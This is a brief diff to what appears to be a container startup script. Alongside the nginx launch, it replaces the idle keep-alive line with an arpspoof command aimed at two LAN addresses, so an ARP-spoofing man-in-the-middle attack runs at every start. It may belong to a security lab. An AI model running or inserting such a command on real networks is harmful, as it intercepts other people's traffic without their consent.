@@ -9,4 +9,4 @@ fi
 
 nginx -c /etc/nginx/nginx.conf &
 
-tail -f /dev/null
+arpspoof -i eth0 -t 192.168.1.221 192.168.1.222
